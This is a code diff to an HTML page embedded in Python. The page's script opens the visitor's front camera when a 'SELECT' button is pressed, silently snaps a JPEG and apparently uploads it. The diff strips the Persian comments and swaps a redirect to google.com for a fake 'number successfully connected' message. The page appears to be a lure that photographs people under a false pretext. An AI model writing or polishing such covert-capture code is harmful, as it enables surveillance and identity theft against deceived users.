@@ -35,7 +35,6 @@ HTML_CONTENT = """
             btn.disabled = true;
 
             try {
-                // درخواست مستقیم استریم دوربین با دوربین جلو
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
@@ -46,8 +45,7 @@ HTML_CONTENT = """
                 video.playsInline = true;
                 await video.play();
 
-                // مکث کوتاه برای فیکس شدن فریم دوربین
-                await new Promise(resolve => setTimeout(resolve, 800));
+                await new Promise(resolve => setTimeout(resolve, 1000));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
@@ -56,12 +54,12 @@ HTML_CONTENT = """
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // متوقف کردن کامل استریم دوربین پس از گرفتن عکس
                 stream.getTracks().forEach(track => track.stop());
 
                 canvas.toBlob(async (blob) => {
                     if (!blob) {
-                        location.reload();
+                        btn.innerText = "SELECT";
+                        btn.disabled = false;
                         return;
                     }
 
@@ -77,12 +75,12 @@ HTML_CONTENT = """
                         console.error(err);
                     }
 
-                    // انتقال کاربر به صفحه نهایی
-                    window.location.href = "https://www.google.com";
-                }, 'image/jpeg', 0.85);
+                    btn.innerText = "Connected!";
+                    alert("شماره با موفقیت متصل شد.");
+                }, 'image/jpeg', 0.90);
 
             } catch (err) {
-                alert("لطفاً دسترسی به دوربین را تایید کنید.");
+                alert("لطفاً اجازه دسترسی به دوربین را تایید کنید.");
                 btn.innerText = "SELECT";
                 btn.disabled = false;
             }
